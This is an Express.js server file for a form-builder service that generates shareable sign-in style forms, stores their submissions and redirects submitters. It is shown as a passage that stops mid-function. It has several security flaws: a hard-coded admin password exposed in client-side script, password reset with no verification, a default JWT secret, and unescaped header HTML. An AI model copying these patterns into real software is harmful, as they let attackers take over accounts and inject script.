// Import required modules
const express = require('express');
const bodyParser = require('body-parser');
const ejs = require('ejs');
const cors = require('cors');
const fs = require('fs').promises;
const path = require('path');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
require('dotenv').config();

// Initialize Express app and port
const app = express();
const port = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-here';

// Define persistent data paths
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
const submissionsFile = path.join(DATA_DIR, 'submissions.json');
const formConfigsFile = path.join(DATA_DIR, 'formConfigs.json');
const usersFile = path.join(DATA_DIR, 'users.json');
const settingsFile = path.join(DATA_DIR, 'settings.json');

// Ensure data directory exists
async function ensureDataDir() {
  try {
    await fs.mkdir(DATA_DIR, { recursive: true });
    console.log(`Data directory ensured: ${DATA_DIR}`);
  } catch (err) {
    console.error('Error creating data directory:', err.message, err.stack);
    throw err;
  }
}

// Initialize submissions file
async function initializeSubmissionsFile() {
  try {
    await fs.access(submissionsFile);
    console.log(`Submissions file exists: ${submissionsFile}`);
  } catch {
    await fs.writeFile(submissionsFile, JSON.stringify([]));
    console.log('Created submissions.json');
  }
}

// Initialize form configs file
async function initializeFormConfigsFile() {
  try {
    await fs.access(formConfigsFile);
    const data = await fs.readFile(formConfigsFile, 'utf8');
    formConfigs = JSON.parse(data);
    console.log('Loaded formConfigs from file');
  } catch {
    await fs.writeFile(formConfigsFile, JSON.stringify({}));
    console.log('Created formConfigs.json');
  }
}

// Initialize settings file
async function initializeSettingsFile() {
  try {
    await fs.access(settingsFile);
    const data = await fs.readFile(settingsFile, 'utf8');
    settings = JSON.parse(data);
    console.log('Loaded settings from file');
  } catch {
    await fs.writeFile(settingsFile, JSON.stringify({ maxFormsPerUser: 10 })); // Default to 10 forms
    settings = { maxFormsPerUser: 10 };
    console.log('Created settings.json with default maxFormsPerUser: 10');
  }
}

// Save formConfigs to file
async function saveFormConfigs() {
  try {
    await fs.writeFile(formConfigsFile, JSON.stringify(formConfigs, null, 2));
    console.log('Saved formConfigs to file');
  } catch (err) {
    console.error('Error saving formConfigs:', err.message, err.stack);
    throw err;
  }
}

// Save settings to file
async function saveSettings() {
  try {
    await fs.writeFile(settingsFile, JSON.stringify(settings, null, 2));
    console.log('Saved settings to file');
  } catch (err) {
    console.error('Error saving settings:', err.message, err.stack);
    throw err;
  }
}

// Initialize users file
async function initializeUsersFile() {
  try {
    await fs.access(usersFile);
    console.log(`Users file exists: ${usersFile}`);
  } catch {
    await fs.writeFile(usersFile, JSON.stringify([]));
    console.log('Created users.json');
  }
}

// Save users to file
async function saveUsers(users) {
  try {
    await fs.writeFile(usersFile, JSON.stringify(users, null, 2));
    console.log('Saved users to file');
  } catch (err) {
    console.error('Error saving users:', err.message, err.stack);
    throw err;
  }
}

// Load users from file
async function loadUsers() {
  try {
    const data = await fs.readFile(usersFile, 'utf8');
    return JSON.parse(data);
  } catch (err) {
    console.error('Error loading users:', err.message);
    return [];
  }
}

// Load user by ID
async function loadUserById(userId) {
  const users = await loadUsers();
  return users.find(u => u.id === userId);
}

// JWT verification middleware
function verifyToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.split(' ')[1];
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    console.error('Token verification error:', error.message);
    res.status(401).json({ error: 'Invalid or expired token' });
  }
}

// Initialize storage
let formConfigs = {};
let settings = {};
(async () => {
  try {
    await ensureDataDir();
    await initializeSubmissionsFile();
    await initializeFormConfigsFile();
    await initializeSettingsFile();
    await initializeUsersFile();
  } catch (err) {
    console.error('Initialization failed:', err.message, err.stack);
    process.exit(1);
  }
})();

// Middleware
app.use(cors({
  origin: ['http://localhost:3000', 'https://plexzora.onrender.com', 'https://your-frontend-domain.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Accept', 'Authorization'],
  credentials: false
}));
app.use(bodyParser.json());
app.use(express.static('public'));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Handle preflight requests
app.options('*', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Authorization');
  res.sendStatus(200);
});

// EJS template for live form (unchanged)
const formTemplate = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><%= templateName %></title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background: <%= theme === 'dark' ? '#1a1f2e' : '#f8f9fa' %>;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 40px 20px 20px;
      box-sizing: border-box;
      transition: background 0.3s ease;
    }
    .login-container {
      background: <%= theme === 'dark' ? '#2f3b5a' : 'white' %>;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, <%= theme === 'dark' ? '0.3' : '0.1' %>);
      width: 320px;
      min-height: <%= minHeight %>;
      height: auto;
      text-align: center;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      gap: 16px;
      opacity: 1;
      margin: 0 auto;
    }
    .login-container:hover {
      transform: scale(1.02);
      box-shadow: 0 8px 24px rgba(0, 0, 0, <%= theme === 'dark' ? '0.4' : '0.15' %>);
    }
    .login-container h2 {
      font-size: 1.8rem;
      font-weight: 700;
      color: <%= theme === 'dark' ? '#ffffff' : '#000000' %>;
      margin: -4px 0 16px;
    }
    .login-container p {
      font-size: 0.9rem;
      font-weight: 400;
      color: <%= subheaderColor %>;
      margin: 0 0 16px;
    }
    .login-container span {
      cursor: default;
      pointer-events: none;
      position: relative;
      display: inline-block;
      margin: 0;
      letter-spacing: 0.5px;
    }
    .login-container span.space {
      margin-right: 4px;
      letter-spacing: 0;
      width: 4px;
      display: inline-block;
    }
    .login-container input {
      width: 100%;
      padding: 14px;
      margin: 8px 0;
      border-radius: 8px;
      font-size: 0.95rem;
      box-sizing: border-box;
      transition: all 0.2s ease;
      border: none;
      box-shadow: <%= borderShadow %>;
      background: <%= theme === 'dark' ? '#3b4a6b' : '#f8f9fa' %>;
      color: <%= theme === 'dark' ? '#f8f9fa' : '#333333' %>;
    }
    .login-container input::placeholder {
      color: <%= theme === 'dark' ? '#b0b8cc' : '#999999' %>;
      opacity: 1;
    }
    .login-container input:focus {
      outline: none;
      box-shadow: 0 0 0 3px rgba(0, 183, 255, 0.3);
      background: <%= theme === 'dark' ? '#3b4a6b' : '#ffffff' %>;
    }
    .login-container input:not(:placeholder-shown) {
      background: <%= theme === 'dark' ? '#3b4a6b' : '#ffffff' %>;
    }
    .login-container button {
      width: 100%;
      padding: 16px;
      margin: 20px 0 0;
      border-radius: 8px;
      font-size: 0.95rem;
      box-sizing: border-box;
      transition: all 0.2s ease;
      background: <%= buttonColor %>;
      color: <%= buttonTextColor %>;
      border: none;
      cursor: pointer;
      font-weight: 500;
      box-shadow: 0 2px 8px rgba(0, 183, 255, 0.3);
    }
    .login-container button:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(0, 183, 255, 0.5);
      background: <%= buttonColor.includes('linear-gradient') ? 'linear-gradient(45deg, #0078ff, #005bb5)' : buttonColor %>;
    }
    .popup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(0.8);
      background: <%= theme === 'dark' ? '#2f3b5a' : '#ffffff' %>;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, <%= theme === 'dark' ? '0.4' : '0.15' %>);
      z-index: 1000;
      text-align: center;
      max-width: 300px;
      width: 90%;
      transition: transform 0.3s ease, opacity 0.3s ease;
      border: 1px solid rgba(0, 183, 255, <%= theme === 'dark' ? '0.2' : '0.1' %>);
    }
    .popup.show {
      display: block;
      transform: translate(-50%, -50%) scale(1);
      opacity: 1;
    }
    .popup h4 {
      font-size: 1rem;
      font-weight: 600;
      color: <%= theme === 'dark' ? '#f8f9fa' : '#333333' %>;
      margin-bottom: 12px;
    }
    .popup p {
      font-size: 0.85rem;
      color: <%= theme === 'dark' ? '#d1d5db' : '#555555' %>;
      margin-bottom: 12px;
      line-height: 1.4;
    }
    .popup-close {
      position: absolute;
      top: 8px;
      right: 8px;
      background: none;
      border: none;
      font-size: 0.85rem;
      color: <%= theme === 'dark' ? '#f8f9fa' : '#555555' %>;
      cursor: pointer;
      transition: color 0.2s ease;
    }
    .popup-close:hover {
      color: #00b7ff;
    }
    .overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 999;
      backdrop-filter: blur(2px);
      transition: opacity 0.3s ease;
    }
    .overlay.show {
      display: block;
      opacity: 1;
    }
    @media (max-width: 768px) {
      body {
        padding: 30px 16px 16px;
      }
      .login-container {
        width: 100%;
        max-width: 300px;
        padding: 20px;
      }
      .login-container h2 {
        font-size: 1.6rem;
      }
      .login-container p {
        font-size: 0.8rem;
      }
      .login-container input, .login-container button {
        padding: 12px;
        font-size: 0.9rem;
      }
      .login-container button {
        padding: 14px;
        margin: 16px 0 0;
      }
      .popup {
        width: 80%;
        max-width: 280px;
        padding: 16px;
      }
    }
    @media (max-width: 480px) {
      .login-container {
        max-width: 280px;
      }
      .login-container h2 {
        font-size: 1.4rem;
      }
      .login-container p {
        font-size: 0.8rem;
      }
      .login-container input, .login-container button {
        font-size: 0.85rem;
        padding: 10px;
      }
      .login-container button {
        padding: 12px;
        margin: 12px 0 0;
      }
      .popup {
        max-width: 260px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2 id="login-header"><%- headerHtml %></h2>
    <p id="login-subheader" style="color: <%= subheaderColor %>"><%= subheaderText %></p>
    <div id="input-fields">
      <% fields.forEach(field => { %>
        <input type="<%= field.type %>" id="login-<%= field.id %>" placeholder="<%= field.placeholder %>" style="box-shadow: <%= borderShadow %>;">
      <% }) %>
    </div>
    <button id="login-button" style="background: <%= buttonColor %>; color: <%= buttonTextColor %>;"><%= buttonText %></button>
  </div>
  <div class="overlay" id="message-overlay"></div>
  <div class="popup" id="message-popup" role="alertdialog" aria-labelledby="message-popup-title">
    <button class="popup-close" id="message-popup-close" aria-label="Close message popup">&times;</button>
    <h4 id="message-popup-title">Message</h4>
    <p id="message-text"></p>
  </div>

  <script>
    const templates = <%- templates %>;

    const loginButton = document.getElementById('login-button');
    const messagePopup = document.getElementById('message-popup');
    const messageOverlay = document.getElementById('message-overlay');
    const messagePopupClose = document.getElementById('message-popup-close');
    const messageText = document.getElementById('message-text');
    const inputFieldsContainer = document.getElementById('input-fields');

    function normalizeUrl(url) {
      if (!url) return null;
      url = url.trim();
      if (url.match(/^https?:\/\//)) return url;
      if (url.match(/\.[a-z]{2,}$/i)) return 'https://' + url;
      return null;
    }

    function showMessagePopup(message) {
      messageText.textContent = message || 'Welcome! You have clicked the button.';
      messagePopup.classList.add('show');
      messageOverlay.classList.add('show');
    }

    function hideMessagePopup() {
      messagePopup.classList.remove('show');
      messageOverlay.classList.remove('show');
    }

    function checkFormFilled() {
      const inputs = inputFieldsContainer.querySelectorAll('input');
      const templateFields = templates['<%= template %>'].fields;

      for (let i = 0; i < inputs.length; i++) {
        const input = inputs[i];
        const value = input.value.trim();
        const fieldId = input.id.replace('login-', '');
        const templateField = templateFields.find(field => field.id === fieldId);

        if (!value && (!templateField || templateField.validation.required)) {
          showMessagePopup('Please fill all required fields before proceeding.');
          return false;
        }

        if (templateField && templateField.validation && templateField.validation.regex) {
          try {
            const regex = new RegExp(templateField.validation.regex);
            if (!regex.test(value)) {
              showMessagePopup(templateField.validation.errorMessage);
              return false;
            }
          } catch (e) {
            console.error('Invalid regex for field:', fieldId, e);
          }
        }
      }
      return true;
    }

    async function submitFormData() {
      const inputs = inputFieldsContainer.querySelectorAll('input');
      const formData = {};
      inputs.forEach(input => {
        const fieldId = input.id.replace('login-', '');
        formData[fieldId] = input.value.trim();
      });

      try {
        const response = await fetch('/form/<%= formId %>/submit', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(formData)
        });
        const result = await response.json();
        if (!response.ok) {
          console.error('Submission failed:', result.error);
          showMessagePopup(result.error || 'Failed to submit form.');
          return false;
        }
        console.log('Submission successful:', result);
        return true;
      } catch (error) {
        console.error('Error submitting form:', error);
        showMessagePopup('An error occurred while submitting the form.');
        return false;
      }
    }

    try {
      loginButton.addEventListener('click', async () => {
        if (!checkFormFilled()) return;
        const submitted = await submitFormData();
        if (!submitted) return;

        const action = '<%= buttonAction %>';
        const url = '<%= buttonUrl %>';
        const message = '<%= buttonMessage %>';
        console.log('Button clicked:', { action, url, message });
        if (action === 'url') {
          const normalizedUrl = normalizeUrl(url);
          if (normalizedUrl) {
            console.log('Redirecting to:', normalizedUrl);
            window.location.href = normalizedUrl;
          } else {
            showMessagePopup('Please enter a valid URL (e.g., www.example.com).');
          }
        } else if (action === 'message') {
          showMessagePopup(message);
        } else {
          console.error('Invalid button action:', action);
          showMessagePopup('Error: Invalid button configuration.');
        }
      });

      messagePopupClose.addEventListener('click', hideMessagePopup);
      messageOverlay.addEventListener('click', hideMessagePopup);
    } catch (error) {
      console.error('Error in form script:', error);
      showMessagePopup('An error occurred. Please try again.');
    }
  </script>
</body>
</html>
`;

// Updated EJS template for admin link management
const adminLinkManagementTemplate = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin: Manage Link Lifespan</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background: #f8f9fa;
      margin: 0;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      max-width: 500px;
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
      text-align: center;
    }
    h1 {
      font-size: 1.8rem;
      margin-bottom: 20px;
    }
    .form-row {
      display: flex;
      flex-direction: column;
      gap: 10px;
      align-items: center;
      margin-bottom: 20px;
    }
    input[type="password"], input[type="number"], select {
      padding: 8px;
      border-radius: 4px;
      border: 1px solid #ddd;
      font-size: 0.9rem;
      width: 100%;
      max-width: 300px;
    }
    .switch {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .switch label {
      font-size: 0.9rem;
      font-weight: 500;
    }
    button {
      padding: 8px 16px;
      background: #0078ff;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 0.9rem;
    }
    button:hover {
      background: #005bb5;
    }
    .error {
      color: red;
      font-size: 0.8rem;
      margin-top: 10px;
    }
    .success {
      color: green;
      font-size: 0.8rem;
      margin-top: 10px;
    }
    .login-container {
      display: none;
    }
    .login-container.show {
      display: block;
    }
    .management-container {
      display: none;
    }
    .management-container.show {
      display: block;
    }
    #lifespan-input {
      display: none;
    }
    #lifespan-input.show {
      display: block;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-container show" id="login-container">
      <h1>Admin Login</h1>
      <div class="form-row">
        <input type="password" id="admin-password" placeholder="Enter admin password">
        <button onclick="login()">Login</button>
      </div>
      <div id="error-message" class="error"></div>
    </div>
    <div class="management-container" id="management-container">
      <h1>Manage All Link Lifespan</h1>
      <p>Total Forms: <span id="form-count">0</span></p>
      <div class="form-row">
        <div class="switch">
          <label>
            <input type="checkbox" id="lifespan-toggle" onchange="toggleLifespan()">
            Set Lifespan / Permanent
          </label>
        </div>
        <div id="lifespan-input">
          <input type="number" min="1" placeholder="Duration" id="duration-input">
          <select id="time-unit">
            <option value="seconds">Seconds</option>
            <option value="minutes">Minutes</option>
            <option value="hours">Hours</option>
          </select>
        </div>
        <button onclick="updateAllLifespan()">Update All Links</button>
      </div>
      <div class="form-row">
        <h2>Max Forms Per User</h2>
        <p>Current Max: <span id="max-forms-count"><%= settings.maxFormsPerUser %></span></p>
        <input type="number" min="1" placeholder="Max Forms" id="max-forms-input">
        <button onclick="setMaxForms()">Set Max Forms</button>
      </div>
      <div id="message" class="success"></div>
    </div>
  </div>

  <script>
    function login() {
      const password = document.getElementById('admin-password').value;
      const errorMessage = document.getElementById('error-message');
      if (password !== 'midas') {
        errorMessage.textContent = 'Invalid password';
        return;
      }
      document.getElementById('login-container').classList.remove('show');
      document.getElementById('management-container').classList.add('show');
      loadFormCount();
    }

    function toggleLifespan() {
      const toggle = document.getElementById('lifespan-toggle');
      const lifespanInput = document.getElementById('lifespan-input');
      lifespanInput.classList.toggle('show', toggle.checked);
    }

    async function loadFormCount() {
      try {
        const response = await fetch('/admin-links/count');
        const data = await response.json();
        if (!response.ok) {
          throw new Error(data.error || 'Failed to fetch form count');
        }
        document.getElementById('form-count').textContent = data.formCount;
      } catch (error) {
        document.getElementById('message').classList.remove('success');
        document.getElementById('message').classList.add('error');
        document.getElementById('message').textContent = error.message;
      }
    }

    async function updateAllLifespan() {
      const toggle = document.getElementById('lifespan-toggle');
      const durationInput = document.getElementById('duration-input');
      const timeUnit = document.getElementById('time-unit').value;
      const duration = durationInput.value;
      const messageEl = document.getElementById('message');

      try {
        if (toggle.checked && (!duration || duration < 1)) {
          throw new Error('Please enter a valid duration');
        }

        const response = await fetch('/admin-links/update', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            password: 'midas', 
            duration: toggle.checked ? parseInt(duration) : null,
            timeUnit: toggle.checked ? timeUnit : null 
          })
        });

        const data = await response.json();
        if (!response.ok) {
          throw new Error(data.error || 'Failed to update lifespan');
        }

        messageEl.classList.remove('error');
        messageEl.classList.add('success');
        messageEl.textContent = 'Lifespan updated successfully for all links';
        loadFormCount();
        setTimeout(() => messageEl.textContent = '', 3000);
      } catch (error) {
        messageEl.classList.remove('success');
        messageEl.classList.add('error');
        messageEl.textContent = error.message;
      }
    }

    async function setMaxForms() {
      const maxFormsInput = document.getElementById('max-forms-input');
      const maxForms = maxFormsInput.value;
      const messageEl = document.getElementById('message');

      try {
        if (!maxForms || maxForms < 1) {
          throw new Error('Please enter a valid number of forms');
        }

        const response = await fetch('/admin-links/set-max-forms', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            password: 'midas', 
            maxForms: parseInt(maxForms) 
          })
        });

        const data = await response.json();
        if (!response.ok) {
          throw new Error(data.error || 'Failed to set max forms');
        }

        messageEl.classList.remove('error');
        messageEl.classList.add('success');
        messageEl.textContent = 'Max forms per user updated successfully';
        document.getElementById('max-forms-count').textContent = maxForms;
        setTimeout(() => messageEl.textContent = '', 3000);
      } catch (error) {
        messageEl.classList.remove('success');
        messageEl.classList.add('error');
        messageEl.textContent = error.message;
      }
    }
  </script>
</body>
</html>
`;

// Utility to normalize URLs
function normalizeUrl(url) {
  if (!url) return null;
  url = url.trim();
  if (url.match(/^https?:\/\//)) return url;
  if (url.match(/\.[a-z]{2,}$/i)) return `https://${url}`;
  return null;
}

// Utility to generate a short, unique code
function generateShortCode(length = 6) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let code = '';
  for (let i = 0; i < length; i++) {
    code += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  if (formConfigs[code]) {
    return generateShortCode(length);
  }
  return code;
}

// Utility to sanitize strings
function sanitizeForJs(str) {
  if (!str) return '';
  return str
    .replace(/['"`]/g, '\\$&')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/&/g, '&amp;');
}

// Calculate expiry time based on duration and unit
function calculateExpiryTime(duration, timeUnit) {
  if (!duration || !timeUnit) return null;
  const now = Date.now();
  let milliseconds;
  switch (timeUnit) {
    case 'seconds':
      milliseconds = duration * 1000;
      break;
    case 'minutes':
      milliseconds = duration * 60 * 1000;
      break;
    case 'hours':
      milliseconds = duration * 60 * 60 * 1000;
      break;
    default:
      throw new Error('Invalid time unit');
  }
  return new Date(now + milliseconds).toISOString();
}

// Check and delete expired forms
async function deleteExpiredForms() {
  try {
    const now = new Date();
    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
    let modified = false;

    Object.keys(formConfigs).forEach(formId => {
      const config = formConfigs[formId];
      if (config.expiryTime && new Date(config.expiryTime) <= now) {
        // Delete form config
        delete formConfigs[formId];
        modified = true;
        
        // Delete associated submissions
        const updatedSubmissions = submissions.filter(s => s.formId !== formId);
        if (updatedSubmissions.length !== submissions.length) {
          submissions.length = 0;
          submissions.push(...updatedSubmissions);
          modified = true;
        }
      }
    });

    if (modified) {
      await saveFormConfigs();
      await fs.writeFile(submissionsFile, JSON.stringify(submissions, null, 2));
      console.log('Expired forms and their submissions deleted');
    }
  } catch (error) {
    console.error('Error deleting expired forms:', error.message, error.stack);
  }
}

// Run expiry check every 10 seconds for finer granularity
setInterval(deleteExpiredForms, 10 * 1000);

// Auth Route: Get current user info
app.get('/user', verifyToken, async (req, res) => {
  try {
    const user = await loadUserById(req.user.userId);
    if (!user) {
      console.error(`User not found for ID: ${req.user.userId}`);
      return res.status(404).json({ error: 'User not found' });
    }
    
    const username = user.username || user.email.split('@')[0];
    res.json({ 
      user: { 
        id: user.id, 
        username,
        email: user.email, 
        createdAt: user.createdAt 
      },
      message: 'User info retrieved successfully' 
    });
  } catch (error) {
    console.error('Error fetching user info:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to fetch user info', details: error.message });
  }
});

// Auth Route: Signup
app.post('/signup', async (req, res) => {
  try {
    const { username, email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({ error: 'Invalid email format' });
    }

    if (password.length < 8) {
      return res.status(400).json({ error: 'Password must be at least 8 characters long' });
    }

    const users = await loadUsers();
    const existingUser = users.find(u => u.email === email);
    if (existingUser) {
      return res.status(400).json({ error: 'User already exists with this email' });
    }

    const saltRounds = 10;
    const hashedPassword = await bcrypt.hash(password, saltRounds);
    const finalUsername = username || email.split('@')[0];

    const newUser = {
      id: Date.now().toString(),
      username: finalUsername,
      email,
      password: hashedPassword,
      createdAt: new Date().toISOString()
    };

    users.push(newUser);
    await saveUsers(users);

    const token = jwt.sign({ userId: newUser.id, email: newUser.email }, JWT_SECRET, { expiresIn: '1h' });
    res.status(201).json({ message: 'User created successfully', token });
  } catch (error) {
    console.error('Signup error:', error.message, error.stack);
    res.status(500).json({ error: 'Signup failed', details: error.message });
  }
});

// Auth Route: Login
app.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }

    const users = await loadUsers();
    const user = users.find(u => u.email === email);
    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const token = jwt.sign({ userId: user.id, email: user.email }, JWT_SECRET, { expiresIn: '1h' });
    res.json({ message: 'Login successful', token });
  } catch (error) {
    console.error('Login error:', error.message, error.stack);
    res.status(500).json({ error: 'Login failed', details: error.message });
  }
});

// Auth Route: Forgot Password
app.post('/forgot-password', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) {
      return res.status(400).json({ error: 'Email is required' });
    }

    const users = await loadUsers();
    const user = users.find(u => u.email === email);
    if (!user) {
      return res.status(404).json({ error: 'Email not found' });
    }

    res.json({ message: 'Email found, proceed to reset' });
  } catch (error) {
    console.error('Forgot password error:', error.message, error.stack);
    res.status(500).json({ error: 'Forgot password check failed', details: error.message });
  }
});

// Auth Route: Reset Password
app.post('/reset-password', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and new password are required' });
    }

    if (password.length < 8) {
      return res.status(400).json({ error: 'New password must be at least 8 characters long' });
    }

    const users = await loadUsers();
    const userIndex = users.findIndex(u => u.email === email);
    if (userIndex === -1) {
      return res.status(404).json({ error: 'Email not found' });
    }

    const saltRounds = 10;
    const hashedPassword = await bcrypt.hash(password, saltRounds);
    users[userIndex].password = hashedPassword;
    users[userIndex].updatedAt = new Date().toISOString();

    await saveUsers(users);

    res.json({ message: 'Password reset successfully' });
  } catch (error) {
    console.error('Reset password error:', error.message, error.stack);
    res.status(500).json({ error: 'Reset password failed', details: error.message });
  }
});

// Create form with expiry and max forms limit
app.post('/create', verifyToken, async (req, res) => {
  try {
    console.log('Received /create request:', req.body);
    const userId = req.user.userId;
    const templateId = req.body.template || 'sign-in';
    const formId = generateShortCode();
    const validActions = ['url', 'message'];

    // Check max forms limit
    const userForms = Object.values(formConfigs).filter(config => config.userId === userId && (!config.expiryTime || new Date(config.expiryTime) > new Date())).length;
    if (userForms >= settings.maxFormsPerUser) {
      console.error(`User ${userId} exceeded max forms limit: ${settings.maxFormsPerUser}`);
      return res.status(403).json({ error: `Maximum form limit of ${settings.maxFormsPerUser} reached` });
    }

    // Calculate expiry time (default 1 hour if not specified)
    let expiryTime = calculateExpiryTime(3600, 'seconds'); // Default to 1 hour
    if (req.body.duration && req.body.timeUnit) {
      const duration = parseInt(req.body.duration);
      if (duration >= 1) {
        expiryTime = calculateExpiryTime(duration, req.body.timeUnit);
      }
    } else if (req.body.duration === null) {
      expiryTime = null; // Permanent
    }

    const config = {
      userId,
      template: templateId,
      headerText: req.body.headerText || 'My Form',
      headerColors: Array.isArray(req.body.headerColors) ? req.body.headerColors.map(sanitizeForJs) : [],
      subheaderText: req.body.subheaderText || 'Fill the form',
      subheaderColor: req.body.subheaderColor || (req.body.theme === 'dark' ? '#d1d5db' : '#555555'),
      placeholders: Array.isArray(req.body.placeholders) ? req.body.placeholders.map(p => ({
        id: sanitizeForJs(p.id),
        placeholder: sanitizeForJs(p.placeholder)
      })) : [],
      borderShadow: req.body.borderShadow || (req.body.theme === 'dark' ? '0 0 0 2px #ffffff' : '0 0 0 2px #000000'),
      buttonColor: req.body.buttonColor || 'linear-gradient(45deg, #00b7ff, #0078ff)',
      buttonTextColor: req.body.buttonTextColor || (req.body.buttonColor === '#ffffff' ? '#000000' : '#ffffff'),
      buttonText: req.body.buttonText || 'Sign In',
      buttonAction: validActions.includes(req.body.buttonAction) ? req.body.buttonAction : 'url',
      buttonUrl: req.body.buttonUrl ? normalizeUrl(req.body.buttonUrl) : '',
      buttonMessage: req.body.buttonMessage || '',
      theme: req.body.theme === 'dark' ? 'dark' : 'light',
      createdAt: new Date().toISOString(),
      expiryTime
    };

    if (config.buttonAction === 'url' && config.buttonUrl && !normalizeUrl(config.buttonUrl)) {
      console.error('Invalid URL provided:', config.buttonUrl);
      return res.status(400).json({ error: 'Invalid URL provided' });
    }
    if (config.buttonAction === 'message' && !config.buttonMessage) {
      config.buttonMessage = 'Form submitted successfully!';
    }

    formConfigs[formId] = config;
    console.log(`Stored form config for ${formId} for user ${userId}:`, config);
    await saveFormConfigs();

    const protocol = process.env.NODE_ENV === 'production' ? 'https' : 'http';
    const host = req.headers.host || `localhost:${port}`;
    const url = `${protocol}://${host}/form/${formId}`;
    console.log('Generated URL:', url);
    res.status(200).json({ url, formId });
  } catch (error) {
    console.error('Error in /create:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to generate shareable link', details: error.message });
  }
});

// Admin route to get form count
app.get('/admin-links/count', async (req, res) => {
  try {
    const formCount = Object.keys(formConfigs).length;
    res.status(200).json({ formCount });
  } catch (error) {
    console.error('Error fetching form count:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to fetch form count', details: error.message });
  }
});

// Admin route to serve link management page
app.get('/admin-links', (req, res) => {
  try {
    res.set('Content-Type', 'text/html');
    res.send(ejs.render(adminLinkManagementTemplate, { settings }));
  } catch (error) {
    console.error('Error rendering admin link management page:', error.message, error.stack);
    res.status(500).send('Error rendering admin link management page');
  }
});

// Admin route to update all form expiries
app.post('/admin-links/update', async (req, res) => {
  const { password, duration, timeUnit } = req.body;

  if (password !== 'midas') {
    return res.status(401).json({ error: 'Invalid admin password' });
  }

  try {
    if (duration !== null && (isNaN(duration) || duration < 1)) {
      return res.status(400).json({ error: 'Invalid duration' });
    }
    if (duration !== null && !['seconds', 'minutes', 'hours'].includes(timeUnit)) {
      return res.status(400).json({ error: 'Invalid time unit' });
    }

    const newExpiryTime = duration ? calculateExpiryTime(duration, timeUnit) : null;

    Object.keys(formConfigs).forEach(formId => {
      formConfigs[formId].expiryTime = newExpiryTime;
    });

    await saveFormConfigs();
    console.log(`Updated expiry for all forms to ${newExpiryTime || 'permanent'}`);
    res.status(200).json({ message: 'All link lifespans updated successfully' });
  } catch (error) {
    console.error('Error updating all form expiries:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to update link lifespans', details: error.message });
  }
});

// Admin route to set max forms per user
app.post('/admin-links/set-max-forms', async (req, res) => {
  const { password, maxForms } = req.body;

  if (password !== 'midas') {
    return res.status(401).json({ error: 'Invalid admin password' });
  }

  try {
